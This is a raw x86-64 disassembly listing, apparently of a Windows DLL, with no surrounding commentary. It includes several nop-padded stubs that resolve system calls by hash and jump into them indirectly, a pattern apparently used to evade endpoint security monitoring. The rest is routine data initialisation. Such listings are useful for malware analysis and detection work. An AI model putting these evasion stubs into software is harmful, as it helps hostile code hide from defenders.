    6d8ca247:	45 39 c8             	cmp    %r9d,%r8d
    6d8ca24a:	76 22                	jbe    0x6d8ca26e
    6d8ca24c:	8b 5a 08             	mov    0x8(%rdx),%ebx
    6d8ca24f:	4c 8b 5a 10          	mov    0x10(%rdx),%r11
    6d8ca253:	8b 38                	mov    (%rax),%edi
    6d8ca255:	44 89 4a 0c          	mov    %r9d,0xc(%rdx)
    6d8ca259:	4c 8b 48 08          	mov    0x8(%rax),%r9
    6d8ca25d:	89 7a 08             	mov    %edi,0x8(%rdx)
    6d8ca260:	4c 89 4a 10          	mov    %r9,0x10(%rdx)
    6d8ca264:	89 18                	mov    %ebx,(%rax)
    6d8ca266:	44 89 40 04          	mov    %r8d,0x4(%rax)
    6d8ca26a:	4c 89 58 08          	mov    %r11,0x8(%rax)
    6d8ca26e:	48 83 c2 10          	add    $0x10,%rdx
    6d8ca272:	eb ba                	jmp    0x6d8ca22e
    6d8ca274:	ff ce                	dec    %esi
    6d8ca276:	eb a5                	jmp    0x6d8ca21d
    6d8ca278:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca27c:	5b                   	pop    %rbx
    6d8ca27d:	5e                   	pop    %rsi
    6d8ca27e:	5f                   	pop    %rdi
    6d8ca27f:	5d                   	pop    %rbp
    6d8ca280:	41 5c                	pop    %r12
    6d8ca282:	41 5d                	pop    %r13
    6d8ca284:	41 5e                	pop    %r14
    6d8ca286:	41 5f                	pop    %r15
    6d8ca288:	c3                   	ret
    6d8ca289:	53                   	push   %rbx
    6d8ca28a:	48 83 ec 20          	sub    $0x20,%rsp
    6d8ca28e:	89 cb                	mov    %ecx,%ebx
    6d8ca290:	e8 67 fe ff ff       	call   0x6d8ca0fc
    6d8ca295:	83 ca ff             	or     $0xffffffff,%edx
    6d8ca298:	85 c0                	test   %eax,%eax
    6d8ca29a:	74 25                	je     0x6d8ca2c1
    6d8ca29c:	44 8b 05 dd 4d 00 00 	mov    0x4ddd(%rip),%r8d        # 0x6d8cf080
    6d8ca2a3:	48 8d 05 d6 4d 00 00 	lea    0x4dd6(%rip),%rax        # 0x6d8cf080
    6d8ca2aa:	31 d2                	xor    %edx,%edx
    6d8ca2ac:	41 39 d0             	cmp    %edx,%r8d
    6d8ca2af:	74 0d                	je     0x6d8ca2be
    6d8ca2b1:	48 83 c0 10          	add    $0x10,%rax
    6d8ca2b5:	39 58 f8             	cmp    %ebx,-0x8(%rax)
    6d8ca2b8:	74 07                	je     0x6d8ca2c1
    6d8ca2ba:	ff c2                	inc    %edx
    6d8ca2bc:	eb ee                	jmp    0x6d8ca2ac
    6d8ca2be:	83 ca ff             	or     $0xffffffff,%edx
    6d8ca2c1:	89 d0                	mov    %edx,%eax
    6d8ca2c3:	48 83 c4 20          	add    $0x20,%rsp
    6d8ca2c7:	5b                   	pop    %rbx
    6d8ca2c8:	c3                   	ret
    6d8ca2c9:	53                   	push   %rbx
    6d8ca2ca:	48 83 ec 20          	sub    $0x20,%rsp
    6d8ca2ce:	89 cb                	mov    %ecx,%ebx
    6d8ca2d0:	e8 27 fe ff ff       	call   0x6d8ca0fc
    6d8ca2d5:	31 d2                	xor    %edx,%edx
    6d8ca2d7:	85 c0                	test   %eax,%eax
    6d8ca2d9:	74 32                	je     0x6d8ca30d
    6d8ca2db:	44 8b 05 9e 4d 00 00 	mov    0x4d9e(%rip),%r8d        # 0x6d8cf080
    6d8ca2e2:	48 8d 15 97 4d 00 00 	lea    0x4d97(%rip),%rdx        # 0x6d8cf080
    6d8ca2e9:	31 c0                	xor    %eax,%eax
    6d8ca2eb:	48 89 d1             	mov    %rdx,%rcx
    6d8ca2ee:	41 39 c0             	cmp    %eax,%r8d
    6d8ca2f1:	74 18                	je     0x6d8ca30b
    6d8ca2f3:	48 83 c2 10          	add    $0x10,%rdx
    6d8ca2f7:	39 5a f8             	cmp    %ebx,-0x8(%rdx)
    6d8ca2fa:	75 0b                	jne    0x6d8ca307
    6d8ca2fc:	48 c1 e0 04          	shl    $0x4,%rax
    6d8ca300:	48 8b 54 01 10       	mov    0x10(%rcx,%rax,1),%rdx
    6d8ca305:	eb 06                	jmp    0x6d8ca30d
    6d8ca307:	ff c0                	inc    %eax
    6d8ca309:	eb e3                	jmp    0x6d8ca2ee
    6d8ca30b:	31 d2                	xor    %edx,%edx
    6d8ca30d:	48 89 d0             	mov    %rdx,%rax
    6d8ca310:	48 83 c4 20          	add    $0x20,%rsp
    6d8ca314:	5b                   	pop    %rbx
    6d8ca315:	c3                   	ret
    6d8ca316:	56                   	push   %rsi
    6d8ca317:	53                   	push   %rbx
    6d8ca318:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca31c:	89 ce                	mov    %ecx,%esi
    6d8ca31e:	e8 d9 fd ff ff       	call   0x6d8ca0fc
    6d8ca323:	31 d2                	xor    %edx,%edx
    6d8ca325:	85 c0                	test   %eax,%eax
    6d8ca327:	74 29                	je     0x6d8ca352
    6d8ca329:	e8 1a 42 00 00       	call   0x6d8ce548
    6d8ca32e:	48 8d 1d 4b 4d 00 00 	lea    0x4d4b(%rip),%rbx        # 0x6d8cf080
    6d8ca335:	31 d2                	xor    %edx,%edx
    6d8ca337:	f7 33                	divl   (%rbx)
    6d8ca339:	89 d2                	mov    %edx,%edx
    6d8ca33b:	48 c1 e2 04          	shl    $0x4,%rdx
    6d8ca33f:	48 01 da             	add    %rbx,%rdx
    6d8ca342:	39 72 08             	cmp    %esi,0x8(%rdx)
    6d8ca345:	75 07                	jne    0x6d8ca34e
    6d8ca347:	e8 fc 41 00 00       	call   0x6d8ce548
    6d8ca34c:	eb e7                	jmp    0x6d8ca335
    6d8ca34e:	48 8b 52 10          	mov    0x10(%rdx),%rdx
    6d8ca352:	48 89 d0             	mov    %rdx,%rax
    6d8ca355:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca359:	5b                   	pop    %rbx
    6d8ca35a:	5e                   	pop    %rsi
    6d8ca35b:	c3                   	ret
    6d8ca35c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8ca361:	90                   	nop
    6d8ca362:	90                   	nop
    6d8ca363:	90                   	nop
    6d8ca364:	90                   	nop
    6d8ca365:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
    6d8ca36a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8ca36f:	90                   	nop
    6d8ca370:	90                   	nop
    6d8ca371:	90                   	nop
    6d8ca372:	90                   	nop
    6d8ca373:	90                   	nop
    6d8ca374:	90                   	nop
    6d8ca375:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    6d8ca37a:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca37e:	90                   	nop
    6d8ca37f:	90                   	nop
    6d8ca380:	90                   	nop
    6d8ca381:	90                   	nop
    6d8ca382:	b9 30 dc bc c5       	mov    $0xc5bcdc30,%ecx
    6d8ca387:	90                   	nop
    6d8ca388:	90                   	nop
    6d8ca389:	e8 88 ff ff ff       	call   0x6d8ca316
    6d8ca38e:	90                   	nop
    6d8ca38f:	90                   	nop
    6d8ca390:	49 89 c7             	mov    %rax,%r15
    6d8ca393:	b9 30 dc bc c5       	mov    $0xc5bcdc30,%ecx
    6d8ca398:	90                   	nop
    6d8ca399:	90                   	nop
    6d8ca39a:	90                   	nop
    6d8ca39b:	90                   	nop
    6d8ca39c:	90                   	nop
    6d8ca39d:	90                   	nop
    6d8ca39e:	90                   	nop
    6d8ca39f:	90                   	nop
    6d8ca3a0:	e8 e4 fe ff ff       	call   0x6d8ca289
    6d8ca3a5:	90                   	nop
    6d8ca3a6:	90                   	nop
    6d8ca3a7:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca3ab:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
    6d8ca3b0:	90                   	nop
    6d8ca3b1:	90                   	nop
    6d8ca3b2:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
    6d8ca3b7:	90                   	nop
    6d8ca3b8:	90                   	nop
    6d8ca3b9:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8ca3be:	90                   	nop
    6d8ca3bf:	90                   	nop
    6d8ca3c0:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
    6d8ca3c5:	90                   	nop
    6d8ca3c6:	90                   	nop
    6d8ca3c7:	49 89 ca             	mov    %rcx,%r10
    6d8ca3ca:	41 ff e7             	jmp    *%r15
    6d8ca3cd:	c3                   	ret
    6d8ca3ce:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8ca3d3:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
    6d8ca3d8:	90                   	nop
    6d8ca3d9:	90                   	nop
    6d8ca3da:	90                   	nop
    6d8ca3db:	90                   	nop
    6d8ca3dc:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8ca3e1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    6d8ca3e6:	90                   	nop
    6d8ca3e7:	90                   	nop
    6d8ca3e8:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca3ec:	b9 21 fc 9c c8       	mov    $0xc89cfc21,%ecx
    6d8ca3f1:	90                   	nop
    6d8ca3f2:	90                   	nop
    6d8ca3f3:	90                   	nop
    6d8ca3f4:	90                   	nop
    6d8ca3f5:	e8 1c ff ff ff       	call   0x6d8ca316
    6d8ca3fa:	90                   	nop
    6d8ca3fb:	90                   	nop
    6d8ca3fc:	90                   	nop
    6d8ca3fd:	90                   	nop
    6d8ca3fe:	49 89 c7             	mov    %rax,%r15
    6d8ca401:	b9 21 fc 9c c8       	mov    $0xc89cfc21,%ecx
    6d8ca406:	90                   	nop
    6d8ca407:	90                   	nop
    6d8ca408:	90                   	nop
    6d8ca409:	90                   	nop
    6d8ca40a:	90                   	nop
    6d8ca40b:	90                   	nop
    6d8ca40c:	e8 78 fe ff ff       	call   0x6d8ca289
    6d8ca411:	90                   	nop
    6d8ca412:	90                   	nop
    6d8ca413:	90                   	nop
    6d8ca414:	90                   	nop
    6d8ca415:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca419:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
    6d8ca41e:	90                   	nop
    6d8ca41f:	90                   	nop
    6d8ca420:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
    6d8ca425:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8ca42a:	90                   	nop
    6d8ca42b:	90                   	nop
    6d8ca42c:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
    6d8ca431:	49 89 ca             	mov    %rcx,%r10
    6d8ca434:	41 ff e7             	jmp    *%r15
    6d8ca437:	c3                   	ret
    6d8ca438:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8ca43d:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
    6d8ca442:	90                   	nop
    6d8ca443:	90                   	nop
    6d8ca444:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8ca449:	90                   	nop
    6d8ca44a:	90                   	nop
    6d8ca44b:	90                   	nop
    6d8ca44c:	90                   	nop
    6d8ca44d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    6d8ca452:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca456:	90                   	nop
    6d8ca457:	90                   	nop
    6d8ca458:	90                   	nop
    6d8ca459:	90                   	nop
    6d8ca45a:	b9 21 d1 2f 26       	mov    $0x262fd121,%ecx
    6d8ca45f:	90                   	nop
    6d8ca460:	90                   	nop
    6d8ca461:	90                   	nop
    6d8ca462:	90                   	nop
    6d8ca463:	90                   	nop
    6d8ca464:	90                   	nop
    6d8ca465:	e8 ac fe ff ff       	call   0x6d8ca316
    6d8ca46a:	49 89 c7             	mov    %rax,%r15
    6d8ca46d:	90                   	nop
    6d8ca46e:	90                   	nop
    6d8ca46f:	b9 21 d1 2f 26       	mov    $0x262fd121,%ecx
    6d8ca474:	90                   	nop
    6d8ca475:	90                   	nop
    6d8ca476:	90                   	nop
    6d8ca477:	90                   	nop
    6d8ca478:	90                   	nop
    6d8ca479:	90                   	nop
    6d8ca47a:	90                   	nop
    6d8ca47b:	90                   	nop
    6d8ca47c:	e8 08 fe ff ff       	call   0x6d8ca289
    6d8ca481:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca485:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
    6d8ca48a:	90                   	nop
    6d8ca48b:	90                   	nop
    6d8ca48c:	90                   	nop
    6d8ca48d:	90                   	nop
    6d8ca48e:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
    6d8ca493:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8ca498:	90                   	nop
    6d8ca499:	90                   	nop
    6d8ca49a:	90                   	nop
    6d8ca49b:	90                   	nop
    6d8ca49c:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
    6d8ca4a1:	49 89 ca             	mov    %rcx,%r10
    6d8ca4a4:	41 ff e7             	jmp    *%r15
    6d8ca4a7:	c3                   	ret
    6d8ca4a8:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8ca4ad:	90                   	nop
    6d8ca4ae:	90                   	nop
    6d8ca4af:	90                   	nop
    6d8ca4b0:	90                   	nop
    6d8ca4b1:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
    6d8ca4b6:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8ca4bb:	90                   	nop
    6d8ca4bc:	90                   	nop
    6d8ca4bd:	90                   	nop
    6d8ca4be:	90                   	nop
    6d8ca4bf:	90                   	nop
    6d8ca4c0:	90                   	nop
    6d8ca4c1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    6d8ca4c6:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca4ca:	b9 44 c6 b8 82       	mov    $0x82b8c644,%ecx
    6d8ca4cf:	90                   	nop
    6d8ca4d0:	90                   	nop
    6d8ca4d1:	90                   	nop
    6d8ca4d2:	90                   	nop
    6d8ca4d3:	90                   	nop
    6d8ca4d4:	90                   	nop
    6d8ca4d5:	90                   	nop
    6d8ca4d6:	90                   	nop
    6d8ca4d7:	e8 3a fe ff ff       	call   0x6d8ca316
    6d8ca4dc:	49 89 c7             	mov    %rax,%r15
    6d8ca4df:	90                   	nop
    6d8ca4e0:	90                   	nop
    6d8ca4e1:	b9 44 c6 b8 82       	mov    $0x82b8c644,%ecx
    6d8ca4e6:	90                   	nop
    6d8ca4e7:	90                   	nop
    6d8ca4e8:	e8 9c fd ff ff       	call   0x6d8ca289
    6d8ca4ed:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca4f1:	90                   	nop
    6d8ca4f2:	90                   	nop
    6d8ca4f3:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
    6d8ca4f8:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
    6d8ca4fd:	90                   	nop
    6d8ca4fe:	90                   	nop
    6d8ca4ff:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8ca504:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
    6d8ca509:	90                   	nop
    6d8ca50a:	90                   	nop
    6d8ca50b:	49 89 ca             	mov    %rcx,%r10
    6d8ca50e:	41 ff e7             	jmp    *%r15
    6d8ca511:	c3                   	ret
    6d8ca512:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8ca517:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
    6d8ca51c:	90                   	nop
    6d8ca51d:	90                   	nop
    6d8ca51e:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8ca523:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
    6d8ca528:	90                   	nop
    6d8ca529:	90                   	nop
    6d8ca52a:	90                   	nop
    6d8ca52b:	90                   	nop
    6d8ca52c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8ca530:	b9 0f 13 a2 02       	mov    $0x2a2130f,%ecx
    6d8ca535:	90                   	nop
    6d8ca536:	90                   	nop
    6d8ca537:	90                   	nop
    6d8ca538:	90                   	nop
    6d8ca539:	90                   	nop
    6d8ca53a:	90                   	nop
    6d8ca53b:	e8 d6 fd ff ff       	call   0x6d8ca316
    6d8ca540:	90                   	nop
    6d8ca541:	90                   	nop
    6d8ca542:	49 89 c7             	mov    %rax,%r15
    6d8ca545:	b9 0f 13 a2 02       	mov    $0x2a2130f,%ecx
    6d8ca54a:	90                   	nop
    6d8ca54b:	90                   	nop
    6d8ca54c:	90                   	nop
    6d8ca54d:	90                   	nop
    6d8ca54e:	90                   	nop
    6d8ca54f:	90                   	nop
    6d8ca550:	90                   	nop
    6d8ca551:	90                   	nop
    6d8ca552:	e8 32 fd ff ff       	call   0x6d8ca289
    6d8ca557:	48 83 c4 28          	add    $0x28,%rsp
    6d8ca55b:	90                   	nop
    6d8ca55c:	90                   	nop
    6d8ca55d:	90                   	nop
    6d8ca55e:	90                   	nop
    6d8ca55f:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
    6d8ca564:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
    6d8ca569:	90                   	nop
    6d8ca56a:	90                   	nop
    6d8ca56b:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8ca570:	90                   	nop
    6d8ca571:	90                   	nop
    6d8ca572:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
    6d8ca577:	49 89 ca             	mov    %rcx,%r10
    6d8ca57a:	41 ff e7             	jmp    *%r15
    6d8ca57d:	c3                   	ret
    6d8ca57e:	90                   	nop
    6d8ca57f:	90                   	nop
    6d8ca580:	c3                   	ret
    6d8ca581:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6d8ca585:	48 85 c0             	test   %rax,%rax
    6d8ca588:	74 03                	je     0x6d8ca58d
    6d8ca58a:	48 ff e0             	rex.W jmp *%rax
    6d8ca58d:	c3                   	ret
    6d8ca58e:	48 8b 05 bb e1 0e 00 	mov    0xee1bb(%rip),%rax        # 0x6d9b8750
    6d8ca595:	48 8d 0d 04 8a 00 00 	lea    0x8a04(%rip),%rcx        # 0x6d8d2fa0
    6d8ca59c:	48 c7 05 99 48 10 00 	movq   $0x58,0x104899(%rip)        # 0x6d9cee40
    6d8ca5a3:	58 00 00 00 
    6d8ca5a7:	48 89 0d 9a 22 0f 00 	mov    %rcx,0xf229a(%rip)        # 0x6d9bc848
    6d8ca5ae:	48 8d 0d ab 22 0f 00 	lea    0xf22ab(%rip),%rcx        # 0x6d9bc860
    6d8ca5b5:	48 89 0d 6c 24 0f 00 	mov    %rcx,0xf246c(%rip)        # 0x6d9bca28
    6d8ca5bc:	48 8d 0d e7 89 00 00 	lea    0x89e7(%rip),%rcx        # 0x6d8d2faa
    6d8ca5c3:	48 8d 15 36 49 10 00 	lea    0x104936(%rip),%rdx        # 0x6d9cef00
    6d8ca5ca:	48 89 0d a7 22 0f 00 	mov    %rcx,0xf22a7(%rip)        # 0x6d9bc878
    6d8ca5d1:	48 8d 0d b8 22 0f 00 	lea    0xf22b8(%rip),%rcx        # 0x6d9bc890
    6d8ca5d8:	48 89 05 79 48 10 00 	mov    %rax,0x104879(%rip)        # 0x6d9cee58
    6d8ca5df:	48 89 15 8a 22 0f 00 	mov    %rdx,0xf228a(%rip)        # 0x6d9bc870
    6d8ca5e6:	48 8d 05 43 22 0f 00 	lea    0xf2243(%rip),%rax        # 0x6d9bc830
    6d8ca5ed:	48 89 0d 3c 24 0f 00 	mov    %rcx,0xf243c(%rip)        # 0x6d9bca30
    6d8ca5f4:	48 8d 15 c5 48 10 00 	lea    0x1048c5(%rip),%rdx        # 0x6d9ceec0
    6d8ca5fb:	48 8d 0d b2 89 00 00 	lea    0x89b2(%rip),%rcx        # 0x6d8d2fb4
    6d8ca602:	48 89 05 17 24 0f 00 	mov    %rax,0xf2417(%rip)        # 0x6d9bca20
    6d8ca609:	48 89 15 90 22 0f 00 	mov    %rdx,0xf2290(%rip)        # 0x6d9bc8a0
    6d8ca610:	48 8d 05 e9 47 10 00 	lea    0x1047e9(%rip),%rax        # 0x6d9cee00
    6d8ca617:	48 89 0d 8a 22 0f 00 	mov    %rcx,0xf228a(%rip)        # 0x6d9bc8a8
    6d8ca61e:	48 8d 15 1b 49 10 00 	lea    0x10491b(%rip),%rdx        # 0x6d9cef40
    6d8ca625:	48 8d 0d 94 22 0f 00 	lea    0xf2294(%rip),%rcx        # 0x6d9bc8c0
    6d8ca62c:	48 89 05 0d 22 0f 00 	mov    %rax,0xf220d(%rip)        # 0x6d9bc840
    6d8ca633:	48 c7 05 0a 48 10 00 	movq   $0x8,0x10480a(%rip)        # 0x6d9cee48
    6d8ca63a:	08 00 00 00 
    6d8ca63e:	66 c7 05 09 48 10 00 	movw   $0x111,0x104809(%rip)        # 0x6d9cee50
    6d8ca645:	11 01 
    6d8ca647:	48 c7 05 c6 47 10 00 	movq   $0x0,0x1047c6(%rip)        # 0x6d9cee18
    6d8ca64e:	00 00 00 00 
    6d8ca652:	48 c7 05 a3 47 10 00 	movq   $0x8,0x1047a3(%rip)        # 0x6d9cee00
    6d8ca659:	08 00 00 00 
    6d8ca65d:	48 c7 05 a0 47 10 00 	movq   $0x8,0x1047a0(%rip)        # 0x6d9cee08
    6d8ca664:	08 00 00 00 
    6d8ca668:	66 c7 05 9f 47 10 00 	movw   $0x319,0x10479f(%rip)        # 0x6d9cee10
    6d8ca66f:	19 03 
    6d8ca671:	c6 05 b8 21 0f 00 01 	movb   $0x1,0xf21b8(%rip)        # 0x6d9bc830
    6d8ca678:	48 c7 05 b5 21 0f 00 	movq   $0x8,0xf21b5(%rip)        # 0x6d9bc838
    6d8ca67f:	08 00 00 00 
    6d8ca683:	48 c7 05 8a 48 10 00 	movq   $0x0,0x10488a(%rip)        # 0x6d9cef18
    6d8ca68a:	00 00 00 00 
    6d8ca68e:	48 c7 05 67 48 10 00 	movq   $0x8,0x104867(%rip)        # 0x6d9cef00
    6d8ca695:	08 00 00 00 
    6d8ca699:	48 c7 05 64 48 10 00 	movq   $0x8,0x104864(%rip)        # 0x6d9cef08
    6d8ca6a0:	08 00 00 00 
    6d8ca6a4:	66 c7 05 63 48 10 00 	movw   $0x319,0x104863(%rip)        # 0x6d9cef10
    6d8ca6ab:	19 03 
    6d8ca6ad:	c6 05 ac 21 0f 00 01 	movb   $0x1,0xf21ac(%rip)        # 0x6d9bc860
    6d8ca6b4:	48 c7 05 a9 21 0f 00 	movq   $0x10,0xf21a9(%rip)        # 0x6d9bc868
    6d8ca6bb:	10 00 00 00 
    6d8ca6bf:	48 c7 05 0e 48 10 00 	movq   $0x0,0x10480e(%rip)        # 0x6d9ceed8
    6d8ca6c6:	00 00 00 00 
    6d8ca6ca:	48 c7 05 eb 47 10 00 	movq   $0x8,0x1047eb(%rip)        # 0x6d9ceec0
    6d8ca6d1:	08 00 00 00 
    6d8ca6d5:	48 c7 05 e8 47 10 00 	movq   $0x8,0x1047e8(%rip)        # 0x6d9ceec8
    6d8ca6dc:	08 00 00 00 
    6d8ca6e0:	66 c7 05 e7 47 10 00 	movw   $0x319,0x1047e7(%rip)        # 0x6d9ceed0
    6d8ca6e7:	19 03 
    6d8ca6e9:	c6 05 a0 21 0f 00 01 	movb   $0x1,0xf21a0(%rip)        # 0x6d9bc890
    6d8ca6f0:	48 c7 05 9d 21 0f 00 	movq   $0x18,0xf219d(%rip)        # 0x6d9bc898
    6d8ca6f7:	18 00 00 00 
    6d8ca6fb:	48 89 0d 36 23 0f 00 	mov    %rcx,0xf2336(%rip)        # 0x6d9bca38
    6d8ca702:	48 8d 0d bb 88 00 00 	lea    0x88bb(%rip),%rcx        # 0x6d8d2fc4
    6d8ca709:	48 89 15 c0 21 0f 00 	mov    %rdx,0xf21c0(%rip)        # 0x6d9bc8d0
    6d8ca710:	48 8d 15 69 47 10 00 	lea    0x104769(%rip),%rdx        # 0x6d9cee80
    6d8ca717:	48 89 0d ba 21 0f 00 	mov    %rcx,0xf21ba(%rip)        # 0x6d9bc8d8
    6d8ca71e:	48 8d 0d cb 21 0f 00 	lea    0xf21cb(%rip),%rcx        # 0x6d9bc8f0
    6d8ca725:	48 89 15 d4 21 0f 00 	mov    %rdx,0xf21d4(%rip)        # 0x6d9bc900
    6d8ca72c:	48 8d 15 ed 21 0f 00 	lea    0xf21ed(%rip),%rdx        # 0x6d9bc920
    6d8ca733:	48 89 0d 06 23 0f 00 	mov    %rcx,0xf2306(%rip)        # 0x6d9bca40
    6d8ca73a:	48 8d 0d 93 88 00 00 	lea    0x8893(%rip),%rcx        # 0x6d8d2fd4
    6d8ca741:	48 89 15 00 23 0f 00 	mov    %rdx,0xf2300(%rip)        # 0x6d9bca48
    6d8ca748:	48 8d 15 31 48 10 00 	lea    0x104831(%rip),%rdx        # 0x6d9cef80
    6d8ca74f:	48 89 0d b2 21 0f 00 	mov    %rcx,0xf21b2(%rip)        # 0x6d9bc908
    6d8ca756:	48 8d 0d 87 88 00 00 	lea    0x8887(%rip),%rcx        # 0x6d8d2fe4
    6d8ca75d:	48 89 15 cc 21 0f 00 	mov    %rdx,0xf21cc(%rip)        # 0x6d9bc930
    6d8ca764:	48 8d 15 e5 21 0f 00 	lea    0xf21e5(%rip),%rdx        # 0x6d9bc950
    6d8ca76b:	48 89 0d c6 21 0f 00 	mov    %rcx,0xf21c6(%rip)        # 0x6d9bc938
    6d8ca772:	48 8d 0d 78 88 00 00 	lea    0x8878(%rip),%rcx        # 0x6d8d2ff1
    6d8ca779:	48 89 15 d0 22 0f 00 	mov    %rdx,0xf22d0(%rip)        # 0x6d9bca50
    6d8ca780:	48 8d 15 b9 45 10 00 	lea    0x1045b9(%rip),%rdx        # 0x6d9ced40
    6d8ca787:	48 c7 05 c6 47 10 00 	movq   $0x0,0x1047c6(%rip)        # 0x6d9cef58
    6d8ca78e:	00 00 00 00 
    6d8ca792:	48 c7 05 a3 47 10 00 	movq   $0x8,0x1047a3(%rip)        # 0x6d9cef40
    6d8ca799:	08 00 00 00 
    6d8ca79d:	48 c7 05 a0 47 10 00 	movq   $0x8,0x1047a0(%rip)        # 0x6d9cef48
    6d8ca7a4:	08 00 00 00 
    6d8ca7a8:	66 c7 05 9f 47 10 00 	movw   $0x319,0x10479f(%rip)        # 0x6d9cef50
    6d8ca7af:	19 03 
    6d8ca7b1:	c6 05 08 21 0f 00 01 	movb   $0x1,0xf2108(%rip)        # 0x6d9bc8c0
    6d8ca7b8:	48 c7 05 05 21 0f 00 	movq   $0x20,0xf2105(%rip)        # 0x6d9bc8c8
    6d8ca7bf:	20 00 00 00 
    6d8ca7c3:	48 c7 05 ca 46 10 00 	movq   $0x0,0x1046ca(%rip)        # 0x6d9cee98
    6d8ca7ca:	00 00 00 00 
    6d8ca7ce:	48 c7 05 a7 46 10 00 	movq   $0x8,0x1046a7(%rip)        # 0x6d9cee80
    6d8ca7d5:	08 00 00 00 
    6d8ca7d9:	48 c7 05 a4 46 10 00 	movq   $0x8,0x1046a4(%rip)        # 0x6d9cee88
    6d8ca7e0:	08 00 00 00 
    6d8ca7e4:	66 c7 05 a3 46 10 00 	movw   $0x319,0x1046a3(%rip)        # 0x6d9cee90
    6d8ca7eb:	19 03 
    6d8ca7ed:	c6 05 fc 20 0f 00 01 	movb   $0x1,0xf20fc(%rip)        # 0x6d9bc8f0
    6d8ca7f4:	48 c7 05 f9 20 0f 00 	movq   $0x28,0xf20f9(%rip)        # 0x6d9bc8f8
    6d8ca7fb:	28 00 00 00 
    6d8ca7ff:	48 c7 05 8e 47 10 00 	movq   $0x0,0x10478e(%rip)        # 0x6d9cef98
    6d8ca806:	00 00 00 00 
    6d8ca80a:	48 c7 05 6b 47 10 00 	movq   $0x8,0x10476b(%rip)        # 0x6d9cef80
    6d8ca811:	08 00 00 00 
    6d8ca815:	48 c7 05 68 47 10 00 	movq   $0x8,0x104768(%rip)        # 0x6d9cef88
    6d8ca81c:	08 00 00 00 
    6d8ca820:	66 c7 05 67 47 10 00 	movw   $0x319,0x104767(%rip)        # 0x6d9cef90
    6d8ca827:	19 03 
    6d8ca829:	c6 05 f0 20 0f 00 01 	movb   $0x1,0xf20f0(%rip)        # 0x6d9bc920
    6d8ca830:	48 c7 05 ed 20 0f 00 	movq   $0x30,0xf20ed(%rip)        # 0x6d9bc928
    6d8ca837:	30 00 00 00 
    6d8ca83b:	48 c7 05 12 45 10 00 	movq   $0x0,0x104512(%rip)        # 0x6d9ced58
    6d8ca842:	00 00 00 00 
    6d8ca846:	48 c7 05 ef 44 10 00 	movq   $0x8,0x1044ef(%rip)        # 0x6d9ced40
    6d8ca84d:	08 00 00 00 
    6d8ca851:	48 c7 05 ec 44 10 00 	movq   $0x8,0x1044ec(%rip)        # 0x6d9ced48
    6d8ca858:	08 00 00 00 
    6d8ca85c:	66 c7 05 eb 44 10 00 	movw   $0x319,0x1044eb(%rip)        # 0x6d9ced50
    6d8ca863:	19 03 
    6d8ca865:	c6 05 e4 20 0f 00 01 	movb   $0x1,0xf20e4(%rip)        # 0x6d9bc950
    6d8ca86c:	48 c7 05 e1 20 0f 00 	movq   $0x38,0xf20e1(%rip)        # 0x6d9bc958
    6d8ca873:	38 00 00 00 
    6d8ca877:	48 89 15 e2 20 0f 00 	mov    %rdx,0xf20e2(%rip)        # 0x6d9bc960
    6d8ca87e:	48 89 0d e3 20 0f 00 	mov    %rcx,0xf20e3(%rip)        # 0x6d9bc968
    6d8ca885:	48 8d 0d f4 20 0f 00 	lea    0xf20f4(%rip),%rcx        # 0x6d9bc980
    6d8ca88c:	48 89 15 fd 20 0f 00 	mov    %rdx,0xf20fd(%rip)        # 0x6d9bc990
    6d8ca893:	48 8d 15 64 87 00 00 	lea    0x8764(%rip),%rdx        # 0x6d8d2ffe
